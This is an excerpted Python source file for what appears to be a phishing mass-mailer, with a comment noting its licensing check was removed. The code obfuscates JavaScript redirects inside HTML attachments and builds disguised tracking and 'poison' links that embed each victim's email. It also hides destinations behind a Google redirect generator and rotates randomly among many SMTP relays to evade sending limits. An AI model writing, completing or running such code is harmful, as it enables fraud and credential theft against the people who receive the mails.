...
def auto_code(link):
    tt = '<script language = "javascript" > document.write(unescape(\'<meta http-equiv="refresh" content="1;url=' + \
        link+'">\')); </script>'
    te = ''.join(["\\u%04x" % (ord(c)) for c in tt])
    nt = '<script type="text/javascript">document.write(unescape(\'' + \
        te+'\'))</script>'
    return nt

def auto_code_html(text):
    ts = ''.join(["\\u%04x" % (ord(c)) for c in text])
    tt = '<script language = "javascript" > document.write(unescape(\'' + \
        ts+'\')); </script>'
    te = ''.join(["\\u%04x" % (ord(c)) for c in tt])
    nt = '<script type="text/javascript">document.write(unescape(\'' + \
        te+'\'))</script>'
...
def findString(email, xstring):
    ...
    xstring = xstring.replace("[Time_own_format]", time.strftime(
        "%d %B, %Y") + time.strftime("%H:%M:%S %p"))
    ...
    for datefound in re.findall(datepattern, xstring, flags=re.DOTALL):
        ...
        xstring = xstring.replace(str(datefound), (datetime.now(
        ) + timedelta(days=int(dr))).strftime('%d %B, %Y'))
    ...
    for urlencodfound in urlencodresult:
        ...
        xstring = xstring.replace(
            str(urlencodfound), urllib.parse.quote_plus(cr.encode('utf-8')))
    ...
    for linkfound in link_bandresult:
        ...
        reply_text = URL_target + "?service=mediafile&UID=" + \
            Random(10) + "&iTeamID=" + poison_url_code + \
            "&media_file_id=" + Random(21) + "&date=" + date
...
def GoogleUrl(link, GoogleApi):
    try:
        ...
        zoneurl = "http://google-redirect-generator.com/?txt=1&code="+GoogleApi + \
            "&url="+link+"countRedir=1&encode_url=1&rand_encode_url=1&rand_domain=1"
...
def redirect403(email, domain403, url):
    ...
    scheme = u.scheme
    domain = u.netloc
    onlyurl = scheme+'://'+str(Random(5))+'.'+domain + \
        '/'+base64encode(email)+'#'+base64encode(url)
    return onlyurl
...
def Screnshot(email):
    ...
    try:
        ...
        hti.screenshot(html_str=html, css_str=css,
                       save_as=imagename, size=(520, 700))
...
def Sendout(emails, smtpserv, port, its_authy, username, password, fromemail, sender, its_secure):
            ...
            if img.lower().startswith('{image}') or img.lower().startswith('{print}'):
                ...
                if not os.path.exists("LOGO_PICS/"+os.path.basename(img)):
                    urllib.request.urlretrieve(
                        img, "LOGO_PICS/"+os.path.basename(img))
    ...
    if usedoc:
        ...
        part.add_header('Content-Disposition', 'attachment',
                        filename=(Header(os.path.basename(htmlfile), 'utf-8').encode()))
        msg.attach(part)

    if autokilllink:
        htmlfilen = auto_code(nlink)
        htmlfile = MakeHtmlLink(
            emails, f"{findString(emails, sfile)}.htm", htmlfilen)
        if autoKillHTML:
            htmlfile = DemonHtml(htmlfile)
        part = MIMEBase('application', "octet-stream")
        b = open(htmlfile, "rb").read()
        ...
        for up_imgsrc in src_imgs:
            if not os.path.exists('IMG'):
                ...
                msgImage.add_header('Content-ID', '<' +
                                    os.path.basename(up_imgsrc)+'>')
                msgImage.add_header('Content-Disposition', 'inline', filename=(
                    Header(os.path.basename(up_imgsrc), 'utf-8').encode()))
                msg.attach(msgImage)
    except Exception as e:
        imgerror = str(e)
        print(imgerror)
    ...
    try:
        try:
            if ConnectSMTP(smtpserv, int(port), its_authy, findString(emails, username), password, emails, findString(emails, sender), its_secure, msg.as_string()):
                print('[ Success ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL +
                      Fore.GREEN+' [ '+emails+' ]'+Style.RESET_ALL+' '+Back.GREEN+' 250 2.0.0 OK '+Style.RESET_ALL+"")
                with open(file_path, "a") as f:
                    f.write(f"{emails}\n")
            else:
                print('[ Failed! ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL +
                      Fore.RED+' [ '+emails+' ]'+Style.RESET_ALL+' '+Back.RED+' 250 2.0.0 FAIL '+Style.RESET_ALL+"")
        except Exception as e:
            while 'unexpectedly closed'.lower() in str(e).lower():
                ...
                print('[ Failed! ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL +
                      Fore.RED+' [ '+emails+' ]'+Style.RESET_ALL+' '+Back.RED+' '+str(e)+' '+Style.RESET_ALL+"")
    except Exception as e:
        while 'unexpectedly closed'.lower() in str(e).lower():
    ...
    def run(self):
        while True:
            try:
                ...
                Sendout(self.default_address, self.smtpserv, self.port, self.its_authy,
                        self.username, self.password, self.fromemail, self.sender, self.its_secure)
            except Exception as e:
                print('[ Failed! ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL +
                      Fore.RED+' [ '+self.default_address+' ]'+Style.RESET_ALL+' '+Back.RED+' '+str(e)+' '+Style.RESET_ALL+"")
            finally:
...
def RandomArraySMTP(file="smtp.txt"):
    ...
    for line_number, smtp_line in enumerate(lines):
        table_row = {'smtp_id': 'smtp' +
                     str(line_number), 'smtp_reset_time': '', 'smtp_count': str(0)}
...
try:
    ...
    # Licensing removed - always proceed
    queue = queue.Queue()
            ...
            if check(email):
                if useRandomSmtp:
                    ...
                    while selected_smtp['smtp_count'] == selected_smtp['smtp_max']:
                        selected_smtp = random.sample(random_smtp, 1)[0]
                        print("{0} used its MaxLimit:{1} ---> Randomly Reselecting another...".format(
                            selected_smtp['smtp_id'], selected_smtp['smtp_max']))
                    selected_smtp['smtp_count'] = str(
                        int(selected_smtp['smtp_count']) + 1)
                    ...
                    queue.put((email, smtpserv, port, its_authy, username,
                              password, fromemail, sender, its_secure))
                else:
                    queue.put((email, smtpserv, port, its_authy, username,
                              password, fromemail, sender, its_secure))
            else:
                print('[ Failed! ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL +
                      Fore.RED+' [ '+email+' ]'+Style.RESET_ALL+' '+Back.RED+' Invalid email '+Style.RESET_ALL)
